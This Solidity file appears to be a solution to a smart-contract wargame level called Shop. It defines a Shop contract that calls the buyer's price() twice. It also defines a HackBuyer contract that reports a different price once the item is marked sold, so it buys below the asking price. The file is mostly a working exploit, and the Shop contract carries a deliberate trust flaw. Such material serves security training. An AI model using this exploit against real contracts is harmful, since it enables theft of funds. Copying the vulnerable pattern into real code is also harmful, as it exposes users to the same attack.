// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract HackBuyer is Buyer {
    uint256 private _price;
    Shop public shop;

    constructor(address shopAddr) public {
        shop = Shop(shopAddr);
        _price = shop.price();
    }

    function price() external view override returns (uint256) {
        if (shop.isSold()) {
            return 1;
        }
        return 100;
    }

    function buy() external {
        shop.buy();
    }
}
